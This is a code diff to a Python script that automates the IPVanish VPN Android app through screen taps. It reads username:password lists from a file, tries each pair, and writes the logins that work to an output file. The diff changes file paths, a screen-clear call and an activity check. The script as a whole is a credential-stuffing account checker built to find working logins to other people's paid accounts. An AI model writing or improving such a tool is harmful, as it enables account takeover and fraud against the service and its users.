@@ -7,6 +7,8 @@ import modules.keyevents as keyevents
 import time
 import os
 
+from modules.settings import directories as path
+
 def Checker():
 	os.system("clear"); header.Checking()
 	ctr=0
@@ -16,7 +18,7 @@ def Checker():
 
 	app='com.ixolit.ipvanish'
 
-	with open ('/home/user/accounts','r') as accounts:
+	with open (path()+'/ipvanish','r') as accounts:
 
 		for lines in accounts:
 	
@@ -43,13 +45,13 @@ def Checker():
 		keyevents.Tap(589,1182)
 		time.sleep(4)
 	
-		os.system("clear");header.title()
+		print("\x1bc");header.title()
 		header.Checking()
 		header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
 	
 		while True:
 		
-			if "TutorialActivity" in keyevents.GetActivity():
+			if "TutorialActivity" in keyevents.GetActivity('mFocusedApp'):
 			
 				keyevents.Tap(566,1230);time.sleep(2)
 		
@@ -58,7 +60,7 @@ def Checker():
 				header.Valid()
 				header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
 			
-				with open ('/home/user/validacc','a') as final:
+				with open (path()+'/ipvanish','a') as final:
 			
 					final.write(str(users[ctr])+":"+str(passwords[ctr]+"\n"))
 					final.close()
